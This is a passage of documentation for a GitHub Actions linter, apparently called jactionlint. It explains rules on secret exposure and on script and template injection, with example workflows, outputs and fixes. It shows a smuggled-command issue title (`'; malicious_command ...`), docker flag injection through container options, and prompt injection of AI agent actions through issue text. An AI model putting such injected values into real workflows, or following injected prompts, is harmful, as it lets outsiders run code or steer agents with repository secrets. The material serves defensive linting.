    uses: octo-org/octo-repo/.github/workflows/deploy.yaml@main
    secrets: inherit
```

Output:

```
test.yaml:4:11: "secrets: inherit" passes every secret of this workflow to the reusable workflow "octo-org/octo-repo/.github/workflows/deploy.yaml@main". list only the secrets it needs in a "secrets:" mapping, e.g. "NAME: ${{ secrets.NAME }}" [secrets-inherit]
  |
4 |     uses: octo-org/octo-repo/.github/workflows/deploy.yaml@main
  |           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNoky7ERgzAMBdCeKbRAcK8qqwBRsBLj75Pk49g+F9O95qEyte55+mB1nohe0gquv4i6izNhCzxgexowaUjzrpH7mk7Y911werrbfC1HeR6L1vFdNpNwJq1ZTOM3AOpyJd8=)

The called workflow receives every secret that the caller can see, so `secrets: inherit` breaks the principle of least privilege and makes it impossible to tell from the caller which secrets the called workflow gets.

**Fix.** Pass the secrets the called workflow needs one by one:

```yaml
jobs:
  deploy:
    uses: octo-org/octo-repo/.github/workflows/deploy.yaml@main
    secrets:
      deploy-token: ${{ secrets.DEPLOY_TOKEN }}
```

There is no automatic fix, because jactionlint cannot know which secrets the called workflow uses.

**Configure.** To accept the inheritance for a trusted workflow of your own organization, ignore the finding with `# jactionlint ignore=secrets-inherit` (see [ignore a finding](ignore.md#ignore-some-errors)) or turn the rule off with `secrets-inherit: off` under `rules`.

<a id="check-overprovisioned-secrets"></a>
## Overprovisioned secrets

The rule `overprovisioned-secrets` reports an expression that uses the whole `secrets` context: `toJSON(secrets)`, `secrets[<computed name>]`, `secrets.*` or a bare `secrets` passed to a function. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          SECRETS: ${{ toJSON(secrets) }}
```

Example config:

```yaml
rules:
  overprovisioned-secrets: warn
```

Output:

```
test.yaml:8:31: warning: the whole "secrets" context is used, which exposes every secret to the runner even if only one is needed. reference each secret by its name, e.g. "secrets.NAME" [overprovisioned-secrets]
  |
8 |           SECRETS: ${{ toJSON(secrets) }}
  |                               ^~~~~~~~
```

<!-- Skip playground link -->

GitHub passes to the runner only the secrets that a job refers to by name. An expression like the one in the example makes it pass all of them, even if the step needs one.

**Configure.** The example sets the level `warn` under `rules` in the [configuration file](config.md#rules), which is why the finding starts with `warning:`; the default level is `error`. To get only the findings of this rule on your own files, run `jactionlint --select=overprovisioned-secrets`.

**Fix.** Refer to each secret by its name instead:

```yaml
env:
  SECRET_ONE: ${{ secrets.SECRET_ONE }}
  SECRET_TWO: ${{ secrets.SECRET_TWO }}
```

`secrets.NAME` and `secrets['NAME']` are not reported. There is no automatic fix.

<a id="check-unredacted-secrets"></a>
## Unredacted secrets

The rule `unredacted-secrets` reports a field that is extracted from a secret parsed with `fromJSON()`, as in `fromJSON(secrets.CREDENTIALS).password`. With the option `pedantic`, it also reports a value that a script cuts from a secret and prints without masking it. It is in the `default` profile, at the level `error`.

Example input:

```yaml
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          PASSWORD: ${{ fromJSON(secrets.CREDENTIALS).password }}
```

Example config:

```yaml
rules:
  unredacted-secrets: warn
```

Output:

```
test.yaml:8:25: warning: secret "CREDENTIALS" is parsed with fromJSON(), and the runner does not redact the fields of a parsed secret from the logs. store each field in its own secret and reference it by name [unredacted-secrets]
  |
8 |           PASSWORD: ${{ fromJSON(secrets.CREDENTIALS).password }}
  |                         ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The runner redacts the exact value of each secret from the logs, but it does not know that a field of a JSON document is a secret too, so the extracted value can show up in the logs in clear.

**Configure.** The example sets the level `warn` under `rules` in the [configuration file](config.md#rules), which is why the finding starts with `warning:`; the default level is `error`. To get only the findings of this rule on your own files, run `jactionlint --select=unredacted-secrets`.

**Fix.** Store each field in its own secret (`secrets.CREDENTIALS_PASSWORD`). Passing the whole parsed secret on (`fromJSON(secrets.X)` without a property access) is not reported. There is no automatic fix.

#### The shell form of unredacted secrets (option pedantic)

With the option `pedantic` (on under the `pedantic` profile) the rule also follows the shell form of the same problem: a script cuts a value out of a secret and prints it.

Example input:

```yaml
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          KEY=$(jq -r .private_key <<<"$CREDENTIALS")
          echo "$KEY"
        env:
          CREDENTIALS: ${{ secrets.CREDENTIALS }}
```

Example config:

```yaml
rules:
  unredacted-secrets:
    pedantic: true
```

Output:

```
test.yaml:8:11: the variable "KEY" is extracted from the secret CREDENTIALS with jq and printed here. the runner masks only the exact value of a secret, not a part of it, so the value is in the log in clear text. mask it first with `echo "::add-mask::$VALUE"` [unredacted-secrets]
  |
8 |           echo "$KEY"
  |           ^~~~
```

<!-- Skip playground link -->

The option is set for the rule in the [configuration file](config.md#rules); the example config of this section is such an entry.

The runner masks a secret in the log by its exact value. `jq -r .private_key` makes a different string, which the runner does not know, and `echo` (or the trace of `set -x`) writes it in clear text. The rule follows the variables of one `run:` script in the order of the source:

- A variable is a **secret** when the `env:` of the step, the job or the workflow gives it a value with `secrets.X`, and so is a copy of one (`A="$SECRET"`; the exact value stays masked). A `${{ secrets.X }}` written in the script counts as well.
- A variable is **derived** when it is set from a command substitution which reads a secret and in which only `echo`, `printf`, `cat` and the tools that cut a text (`jq`, `yq`, `cut`, `awk`, `sed`, `tr`, `base64`, `grep`, `head`, `tail`, `xxd`, `rev`, `fold`, `python`, `node`, `perl`, `ruby`) stand between the secret and the value (`echo "$S" | base64 -d | jq -r .key`), from a parameter expansion that cuts one (`${SECRET#prefix}`, `${SECRET:0:8}`), or when it is a copy of a derived variable.
- It is reported where the variable is **printed**: `echo` or `printf` of it, `cat <<<"$KEY"` or a heredoc which expands it, or `echo "$(jq ... <<<"$S")"`. It is also reported where `set -x` is on (also `set -euxo pipefail`, `set -o xtrace`) at the assignment or at a command that uses the value, because the trace shows both with the values expanded. The value is in the log before any mask can take effect, so turn the trace off with `set +x`.
- `echo "::add-mask::$KEY"` after the assignment and before the print makes it safe.

Not reported: the value as the argument of another command (`curl -H "Authorization: $KEY"`, `./deploy --key "$KEY"`), a value written to a file or to `$GITHUB_ENV` or `$GITHUB_OUTPUT`, a value piped into another command (`echo "$KEY" | base64 -d > key.pem`), the exact secret or a string that contains it, a hash (`sha256sum`) or a count (`wc -c`) of it, and the answer of a service that gets the secret as credentials (`curl -u "$S" ... | jq -r .id`).

#### How unredacted-secrets reads a shell script

The rule answers one question: what does a word hold, once the shell has expanded it? It asks it for the words of a command, the value of an assignment (`A=`, `A+=`, `export A=`), a here-string and an unquoted heredoc (also a `${{ secrets.X }}` in it). Only `bash` and `sh` scripts are read, in the order of the source.

- A command substitution holds what its last command prints, followed back along its pipe through `echo`, `printf`, `cat` and the tools listed for derived variables, also when substitutions are nested. Assignments inside a substitution stay in its subshell.
- A print is `echo`, `printf` or `cat` whose stdout is not redirected and not piped on (`echo "$KEY" | cat` prints, `echo "$KEY" | wc -c` does not). The input of `cat` is its here-string, its heredoc or the pipe. An expansion in a heredoc is valued as the same word on a command line (`${KEY:0:8}` is a cut, a masked variable is exact).
- A `::add-mask::` masks only when it is the whole line and printed that way: `echo "::add-mask::$KEY"` with that one argument, or `printf '::add-mask::%s\n' "$KEY"`, of exactly one variable or one `$(...)`. A mask of a cut (`${KEY:0:4}`), or one with more text or more arguments, masks another string and is an ordinary print.
- `printf -v NAME ...` (with `-v` as the first argument) assigns and prints nothing; `-v` after the format is data.
- Under `set -x`, every command that expands a cut value is reported, an assignment included.

**What is not understood, and so reported as nothing:** functions, loops and branches (the order of the source decides, so a mask in one `if` branch counts for the next), `eval`, `source`, `read`, `mapfile`, arrays, indirect expansion, a process substitution (`<(cmd)` is the name of a file), commands in the body of a heredoc as a source, a value that is written out by anything other than `echo`, `printf` and `cat` (`tee`, `logger`, `curl --data`), a secret that reaches the script through `with:` of an action, and `pwsh` or any other shell.

<a id="check-secrets-outside-env"></a>
## Secrets outside an environment (pedantic)

The rule `secrets-outside-env` reports a job that uses a secret but has no `environment:`, and a job that passes a secret to a reusable workflow. It is in the `pedantic` profile, at the level `warn`.

Example input:

```yaml
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.API_KEY }}
```

Example config:

```yaml
rules:
  secrets-outside-env: warn
```

Output:

```
test.yaml:8:24: warning: secret "API_KEY" is used by a job which has no "environment:", so it is a repository or organization secret exposed to every job. move it to an environment with protection rules and set "environment:" at the job [secrets-outside-env]
  |
8 |           API_KEY: ${{ secrets.API_KEY }}
  |                        ^~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=secrets-outside-env`, or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules); the example config of this section is such an entry.

Secrets of a repository or an organization are exposed to every job that asks for them. The secrets of an [environment](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment) are only available to jobs that meet its protection rules (required reviewers, branch restrictions), which limits the damage of a compromised workflow.

**Fix.** Move the secret to an environment, remove it from the repository secrets, and set `environment:` at the job. jactionlint cannot see where a secret is stored, so it assumes that the secrets of a job with an `environment:` are environment secrets. There is no automatic fix. The line of a secret in a folded block scalar (`>-`) is the line where the block starts.

**Secrets passed to a reusable workflow.** A job that calls a reusable workflow cannot have an `environment:`, so a secret that it passes with `secrets:` is a repository or organization secret, which no environment protects. The rule reports it with a message of its own, at the secret in the `secrets:` of the call. A job of the called workflow can have an environment of its own and use the secrets of that environment, which is a different secret: that design is not reported. `secrets: inherit` names no secret and is not reported here (see [`secrets-inherit`](#check-secrets-inherit)). Only the values under `secrets:` are read: a secret in another field of the job (`with:`, `if:`, `name:`, where the `secrets` context is not available and the expression check reports it) is not a secret that is passed on.

```yaml
jobs:
  deploy:
    uses: ./.github/workflows/deploy.yaml
    secrets:
      token: ${{ secrets.DEPLOY_TOKEN }}
```

**What is not reported.** `GITHUB_TOKEN`, because its permissions are set by the workflow. Workflows that run through `workflow_call` are skipped: environment secrets do not reach a reusable workflow unless the caller inherits all secrets. Secrets that are fine outside of an environment can be listed in the `allow` option (names are case-insensitive):

```yaml
rules:
  secrets-outside-env:
    level: warn
    allow: [CI_COVERAGE_TOKEN]
```

**Related.** How this rule compares with zizmor is on the [zizmor parity page](zizmor-parity.md).

<a id="check-workflow-secret-scope"></a>
## Workflow-level secrets (pedantic)

The rule `workflow-secret-scope` reports a named secret that is assigned to the workflow-level `env:` when it reaches the steps of two or more jobs. With the option `job-level`, it also reports a secret in the `env:` of a job that reaches the steps of that job. It is in the `pedantic` profile, at the level `warn`.

Example input:

```yaml
on: workflow_dispatch
env:
  DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo build
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

Example config:

```yaml
rules:
  workflow-secret-scope: warn
```

Output:

```
test.yaml:3:21: warning: secret "DEPLOY_TOKEN" is assigned to the workflow-level env "DEPLOY_TOKEN", so it reaches 2 jobs. set it at the job or the step that needs it instead [workflow-secret-scope]
  |
3 |   DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  |                     ^~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**Configure.** The rule is off under the `default` profile. Run it with `--profile pedantic`, with `--select=workflow-secret-scope`, or turn it on for this rule alone under `rules` in the [configuration file](config.md#rules); the example config of this section is such an entry.

Every step of the jobs that the secret reaches can read it, including third-party actions.

**Fix.** Set the value at the job or the step that needs it. There is no automatic fix, because moving the value changes where it is visible to expressions.

**What is not reported.** A workflow with a single job. A job or step that sets the variable itself does not receive the workflow-level value, and a job that calls a reusable workflow does not pass `env:` on, so neither counts. `GITHUB_TOKEN` is never reported.

**The option job-level.** The option `job-level` (off unless set) does the same for the `env:` of a job: a secret there reaches every step of the job, third-party actions included, so it is reported when the job has two or more steps that do not set the variable themselves.

```yaml
rules:
  workflow-secret-scope:
    level: warn
    job-level: true
```

With the option, the secret of this job is reported, because it reaches both steps although only the second one needs it:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}   # reaches both steps
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh                      # the only step that needs it
```

**Related.** How this rule compares with zizmor is on the [zizmor parity page](zizmor-parity.md).

<a id="untrusted-inputs"></a>
## Script injection by potentially untrusted inputs

The rule `template-injection` reports a `${{ }}` expression that pastes potentially untrusted input, such as the title of a pull request, into a script before the script runs. The rule is in the `correctness` profile. The `default` profile adds [values that an outsider chooses but that are not on the list of untrusted properties](#check-template-injection-inputs), and the option `pedantic` adds [every other expansion in a script](#check-template-injection-expansion).

Example input:

```yaml
name: Test
on: pull_request

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Print pull request title
        # ERROR: Using the potentially untrusted input can cause script injection
        run: echo '${{ github.event.pull_request.title }}'
      - uses: actions/stale@v9
        with:
          repo-token: ${{ secrets.TOKEN }}
          # This is OK because action input is not evaluated by shell
          stale-pr-message: ${{ github.event.pull_request.title }} was closed
      - uses: actions/github-script@v7
        with:
          # ERROR: Using the potentially untrusted input can cause script injection
          script: console.log('${{ github.event.head_commit.author.name }}')
      - name: Get comments
        # ERROR: Accessing untrusted inputs via `.*` object filter; bodies of comment, review, and review_comment
        run: echo '${{ toJSON(github.event.*.body) }}'
      - name: Do something with checking skip
        # OK: This placeholder uses an untrusted input, but the input cannot be injected to the script
        run: if [ "${{ contains(github.event.pull_request.title, '[SKIP]') }}" = "true" ]; then echo "skip"; fi
```

Output:

```
test.yaml:10:24: "github.event.pull_request.title" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
10 |         run: echo '${{ github.event.pull_request.title }}'
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:19:36: "github.event.head_commit.author.name" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
19 |           script: console.log('${{ github.event.head_commit.author.name }}')
   |                                    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:22:31: object filter extracts potentially untrusted properties "github.event.comment.body", "github.event.discussion.body", "github.event.issue.body", "github.event.pull_request.body", "github.event.review.body", "github.event.review_comment.body". avoid using the value directly in inline scripts. instead, pass the value through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
22 |         run: echo '${{ toJSON(github.event.*.body) }}'
   |                               ^~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqMkUFrGzEQhe/+FY+lYKd0t8dShUIOLaUNJIHkFkKQ5YmlWqvZakYOJfi/F+0GY7eY9iRG8/S9x1OyPRnckeiMk8FQYnzM9LPUi9kPXoqZAUqi9QRySdJWYVmWpKWNtu7GlSgNMqmAFhP4JoekIxWvVGjQSK+yEWhAzjPmb15esA7qy7KjLSXtDsN04zPsdvO9QxESA+s0cJL3ojbSxfbjnvwc1Jv9BGQauFXeUDKoVkIuk0p3d3355Qq73YF0ZLVDbnsSsWsy+L9seLYCF1lodSLlxGjF5TDoxfbDybSTwsBxEo7URV4v/m7Ik109Ou77oJ0t6jl3tfda09kfP/GVFFVJSeVU+8rfb6+vFkcWb7slr36dHTU/ET8zhHtSH9J6zA/nyW3qJJswHJuEJ9yjqSaOk9qQZPGPPt9hfn97+e3mYV7NG3xCo7lQg4dzqKc05W6qVXOOp/B7AFEp4YU=)

A `${{ }}` placeholder is evaluated and replaced by the GitHub Actions runtime before the script runs, so it needs care in an inline script at `run:`. Take this step:

```yaml
- run: echo 'issue ${{github.event.issue.title}}'
```

An attacker can create an issue with the title `'; malicious_command ...`, and the inline script then runs `echo 'issue'; malicious_command ...` in your workflow.

**Fix.** Pass the potentially untrusted input through an environment variable and read it as a variable of the shell. See [the secure use reference of GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use) for more details.

```yaml
- run: echo "issue ${TITLE}"
  env:
    TITLE: ${{github.event.issue.title}}
```

**What is reported.** jactionlint recognizes the following inputs as potentially untrusted and checks your inline scripts at `run:`. When one of them is used directly in a script, jactionlint reports a finding.

- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.review_comment.body`
- `github.event.pages.*.page_name`
- `github.event.commits.*.message`
- `github.event.head_commit.message`
- `github.event.head_commit.author.email`
- `github.event.head_commit.author.name`
- `github.event.commits.*.author.email`
- `github.event.commits.*.author.name`
- `github.event.pull_request.head.ref`
- `github.event.pull_request.head.label`
- `github.event.pull_request.head.repo.default_branch`
- `github.event.pull_request.head.repo.description`
- `github.event.discussion.title`
- `github.event.discussion.body`
- `github.event.head_commit.committer.email`
- `github.event.head_commit.committer.name`
- `github.event.commits.*.committer.email`
- `github.event.commits.*.committer.name`
- `github.event.workflow_run.head_branch`
- `github.event.workflow_run.display_title`
- `github.event.workflow_run.head_commit.message`
- `github.event.workflow_run.head_commit.author.email`
- `github.event.workflow_run.head_commit.author.name`
- `github.event.workflow_run.head_commit.committer.email`
- `github.event.workflow_run.head_commit.committer.name`
- `github.event.workflow_run.pull_requests.*.head.ref`
- `github.event.workflow_run.head_repository.description`
- `github.event.workflow_run.head_repository.owner.login`
- `github.head_ref`

jactionlint also detects those properties when a script reaches them indirectly through the [object filter syntax](https://docs.github.com/en/actions/learn-github-actions/expressions#object-filters). For example, `github.event.*.body` collects all `body` properties in the child objects of `github.event` as an array. Those properties include untrusted inputs such as `github.event.comment.body` and `github.event.pull_request.body`.

```sh
# Echo list of github.event.comment.body, github.event.pull_request.body, ...
echo '${{ toJSON(github.event.*.body) }}'
```

Store the JSON string in an environment variable instead:

```yaml
- run: echo "${BODIES}"
  env:
    BODIES: '${{ toJSON(github.event.*.body) }}'
```

**What is not reported.** The following functions return a boolean value, so nothing can be injected through the result. jactionlint reports no finding when untrusted inputs are passed to them:

- `contains()`
- `startswith()`
- `endswith()`

The popular action [actions/github-script](https://github.com/actions/github-script) has the same issue in its `script` input, and jactionlint checks that input too.

### Untrusted inputs through objects, environment variables and action inputs

The rule `template-injection` also reports the same risk when it is less direct:

- every `${{ }}` of a script is checked, not only the first one;
- an object that holds untrusted properties, like `toJSON(github.event)`, is reported because the script gets the title and the body of the issue as a part of the JSON;
- an environment variable that is set from an untrusted input, like `env.TITLE` in the example, is reported when it is expanded with `${{ env.TITLE }}`. Reading it as a variable of the shell (`"$TITLE"`) is the fix, and it is what the environment variable is for;
- inputs of well-known actions that run their value as code are checked like `run:` and the `script` of github-script (the table that follows the list names them);
- fields that GitHub passes to docker are checked too: see [Container options, Docker steps and AI agent inputs](#check-template-injection-sinks);
- the prompt, the arguments and the settings of [AI agent actions](#check-agentic-actions) are checked too.

These inputs run their value as code, so an expression in them is as dangerous as one in `run:`:

| Action | Inputs |
| --- | --- |
| `actions/github-script`, `amadevus/pwsh-script`, `appleboy/ssh-action`, `cross-the-world/ssh-pipeline` | `script` |
| `addnab/docker-run-action` | `options`, `run` |
| `azure/cli`, `azure/powershell` | `inlineScript` |
| `borales/actions-yarn`, `mikefarah/yq` | `cmd` |
| `cardinalby/js-eval-action` | `expression` |
| `cloudflare/wrangler-action` | `preCommands`, `postCommands` |
| `cypress-io/github-action` | `build`, `command`, `command-prefix`, `install-command`, `start`, `start-windows` |
| `d3rhase/ssh-command-action`, `fifsky/ssh-action`, `garygrossgarten/github-action-ssh`, `google-github-actions/ssh-compute`, `jimcronqvist/action-ssh`, `matootie/dokku` | `command` |
| `devcontainers/ci` | `runCmd` |
| `gabrielbb/xvfb-action`, `mathiasvr/command-output` | `run` |
| `jannekem/run-python-action` | `code` |
| `nick-fields/retry`, `nick-invision/retry` (the former name) | `command`, `on_retry_command` |
| `wandalen/wretry.action` | `command`, `pre_retry_command` |

Example input:

```yaml
on: issue_comment

env:
  TITLE: ${{ github.event.issue.title }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: The environment variable holds an untrusted input, so expanding it has the same effect
      - run: echo '${{ env.TITLE }}'
      # ERROR: Every untrusted expression of a script is reported
      - run: |
          echo '${{ github.head_ref }}'
          echo '${{ github.event.comment.body }}'
      # ERROR: The object has untrusted properties
      - run: echo '${{ toJSON(github.event) }}'
      # ERROR: This input of the action is run as code
      - uses: nick-fields/retry@v3
        with:
          command: echo ${{ github.head_ref }}
          timeout_minutes: 5
      # OK: The shell expands the variable
      - run: echo "$TITLE"
```

Output:

```
test.yaml:11:24: environment variable "env.TITLE" holds the potentially untrusted input "github.event.issue.title". expanding it with ${{ }} in an inline script is as dangerous as using the input directly. instead, read it as a variable of the shell [template-injection]
   |
11 |       - run: echo '${{ env.TITLE }}'
   |                        ^~~~~~~~~
test.yaml:14:21: "github.head_ref" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
14 |           echo '${{ github.head_ref }}'
   |                     ^~~~~~~~~~~~~~~
test.yaml:15:21: "github.event.comment.body" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
15 |           echo '${{ github.event.comment.body }}'
   |                     ^~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:17:31: "github.event" includes potentially untrusted properties such as "github.event.comment.body". avoid expanding it in inline scripts. instead, pass the properties you need through environment variables [template-injection]
   |
17 |       - run: echo '${{ toJSON(github.event) }}'
   |                               ^~~~~~~~~~~~~
test.yaml:21:29: "github.head_ref" is potentially untrusted. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
21 |           command: echo ${{ github.head_ref }}
   |                             ^~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNpskL9Ow0AMh/c8hVVVKgw5BsRyEwsDCMFA9yh/XHKQ+FBsB1Ul746cRm2q5paT5e93n32RPARmxayMbYskSYLU+wRg+7x9ffKwPhzgM0ithcMeSdxIOwnSIAxDknzFgo0XZLEboFPi1B7WQkk0bXLrjS0W/OEjBZAa6QHLOsLGPEi9G7UwDJtL6G8q7ZwD02A15lXW4W4WW+SOC0yLuiJW+2vROSTx5eP97Waevb3glZE9UCi/013ApuK7DqXbP/b3pyF+g9T+VAGYO6dq0iyvMMMltBhVsjaQiskeFoZdrcc/W/0PAOmOiEM=)

**Automatic fix.** `--fix` fixes the findings in `run:` scripts of bash and sh when it can show that the fix does the same: the `${{ }}` is in double quotes or single quotes, and the script has no here-document, command substitution or comment around it. The expression is replaced with a shell variable: one of the `GITHUB_*` and `RUNNER_*` variables that the runner sets already, like `$GITHUB_HEAD_REF`, or a new one in the `env:` of the step:

```yaml
- run: echo "title is ${TITLE}"
  env:
    TITLE: ${{ github.event.issue.title }}
```

An unquoted expression is quoted only where the shell cannot split it into several words: the value of an assignment such as `TITLE=${{ github.event.issue.title }}`. Because the text of the script changes, that fix needs `--fix=unsafe`. See [Fix findings automatically](./fix.md#fix-errors-automatically) for the two fix modes.

An unquoted expression anywhere else is not fixed in any mode: an argument of a command (`echo ${{ github.event.issue.title }}`), a redirection target, a word list like `for f in ${{ inputs.files }}; do` or an array like `files=(${{ inputs.files }})`. The value may be meant to expand to several words, and quoting it would make one word of it. The finding says so in its `no_fix` reason (code `needs-judgment`). Pass the value through `env:` yourself and decide how the script splits it.

A script that does not parse gets no fix for its unquoted expressions either. Scripts of other shells (PowerShell, cmd, Python) are not fixed.

**Configure.** Set the level of the rule, or turn it off with `template-injection: off`, in `rules` of the [configuration file](./config.md#rules). To ignore one finding, put `# jactionlint ignore=template-injection` on the line before it or at the end of the line: see [ignore findings](./ignore.md#ignore-some-errors).

**Related.** [Container options, Docker steps and AI agent inputs](#check-template-injection-sinks), [values that an outsider chooses](#check-template-injection-inputs) and [expansions in scripts](#check-template-injection-expansion) belong to the same rule. [command-injection](#check-command-injection) reports a value that a script parses again after it moved to an environment variable.

<a id="check-template-injection-sinks"></a>
### Container options, Docker steps and AI agent inputs

`template-injection` also reports an attacker controlled `${{ }}` in the places where a runner or an action reads a string as a command line or as the instructions of an agent, although they are not scripts:

| Place | Why it matters |
| --- | --- |
| `container.options` and `services.<id>.options` | docker reads them as command line flags, so text can add `--privileged`, `--volume` or `--entrypoint` |
| `image`, `entrypoint`, `command` and `volumes` of `container` and of a service | the attacker chooses what runs, or which path of the runner is mounted |
| `args` and `entrypoint` of a `docker://` step | they are the command line of the container |
| `prompt`, `claude_args`, `settings` and the other inputs of [AI agent actions](#check-agentic-actions) | the agent reads the prompt as instructions, and the arguments and settings add tools, servers and hooks |

Only contexts that an attacker controls are reported in these places, unlike in a script: `matrix.node` in an `image` is how containers are written. The environment variable is not a remedy for these places, because the `env` context is not available in a container and an agent reads the environment as it reads the prompt. Use a fixed value, or one from a fixed list, and for an agent follow the advice of [AI agent actions](#check-agentic-actions). `shell:` takes no expression, so it is not a sink.

Example input:

```yaml
on: issues

jobs:
  triage:
    runs-on: ubuntu-latest
    container:
      image: node:20
      # ERROR: docker reads the options as command line flags
      options: --user ${{ github.event.issue.title }}
    steps:
      # ERROR: the agent reads the prompt as instructions, and quoting cannot change that
      - uses: anthropics/claude-code-action@v1
        with:
          prompt: Triage "${{ github.event.issue.title }}"
      # OK: the number of the issue is not text
      - uses: anthropics/claude-code-action@v1
        with:
          prompt: Triage the issue number ${{ github.event.issue.number }}
```

Output:

```
test.yaml:9:27: "github.event.issue.title" is potentially untrusted and is expanded into the options of the container of the job. docker reads them as command line flags, so text from an attacker can add flags such as --privileged, --volume or --entrypoint. use a fixed value, or choose one from a fixed list such as a matrix or an input of type choice [template-injection]
  |
9 |       options: --user ${{ github.event.issue.title }}
  |                           ^~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:14:31: "github.event.issue.title" is potentially untrusted and is expanded into the "prompt" input of Claude Code Action. the agent reads the prompt as instructions, so text from an attacker can steer the agent, and quoting or escaping cannot prevent that. do not put event data in the prompt: let the agent read it with its own tools, and give the agent only the permissions, secrets and tools that the worst instruction could use [template-injection]
   |
14 |           prompt: Triage "${{ github.event.issue.title }}"
   |                               ^~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNq0UDluxDAM7P2KwSKtnKNUlUfkA7JMrBXYpCCSm2Lhvwc+ki5ItZ3EucgRjiiqTtp1nzJo7ABrJV1pewHNWcNG8sHZPMzJSG2HsrClwtQOJlCWTQaWkeLbyzmUakVYI0JwpYan+x3XYpMPPd2Ird/Teys2E9Z1V6lR1R/XAFfSiMQ2Nakl63Oek48UsowUUt7832+vJx34KjbF3x9QmyzVIj72s3D5Z4PLg3JtoqNpsC/D302c6Lp+DwDREIHh)

<a id="check-template-injection-inputs"></a>
## Inputs, payloads, release names and branch names

The rule `template-injection` also reports values that are not on the list of [untrusted properties](#untrusted-inputs), but that a person outside the workflow chooses and that GitHub does not validate. It reports them in the `default` and `pedantic` profiles, not in `correctness` (which is what actionlint reports), because a `${{ }}` of them in a script runs whatever the sender typed.

Example input:

```yaml
on:
  workflow_dispatch:
    inputs:
      title:
        type: string
      dry-run:
        type: boolean
  repository_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: whoever starts the run types the title
      - run: echo "${{ inputs.title }}"
      # ERROR: the sender of the event chooses the payload
      - run: echo "${{ github.event.client_payload.branch }}"
      # ERROR: a branch name can hold shell syntax
      - run: echo "${{ github.ref_name }}"
      # OK: a boolean cannot hold anything else
      - run: echo "${{ inputs.dry-run }}"
      # OK: the shell expands the variable
      - run: echo "$TITLE"
        env:
          TITLE: ${{ inputs.title }}
```

Output:

```
test.yaml:15:24: "inputs.title" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
15 |       - run: echo "${{ inputs.title }}"
   |                        ^~~~~~~~~~~~
test.yaml:17:24: "github.event.client_payload.branch" is the payload of a repository_dispatch event, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
17 |       - run: echo "${{ github.event.client_payload.branch }}"
   |                        ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:19:24: "github.ref_name" is a branch or tag name, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
19 |       - run: echo "${{ github.ref_name }}"
   |                        ^~~~~~~~~~~~~~~
```

